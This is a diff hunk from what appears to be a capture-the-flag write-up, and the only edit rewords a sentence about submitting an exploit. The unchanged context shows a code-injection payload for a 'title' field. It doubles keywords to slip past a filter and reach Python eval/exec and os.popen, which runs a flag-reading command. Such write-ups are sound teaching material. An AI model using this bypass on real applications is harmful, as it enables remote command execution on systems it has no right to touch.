@@ -58,7 +58,7 @@ Thus, we can craft the following the exploit input into the `title` field.
 ",evevalal("exexecec('impimportort ooss'), ooss.popen('/readflag').read()"))#
 ```
 
-And sending/running it on the application gives us the flag!
+With that, we can send it as the `title` input field and running the template gives us the flag!
 
 ![](images/Pasted%20image%2020221205194656.png)
 
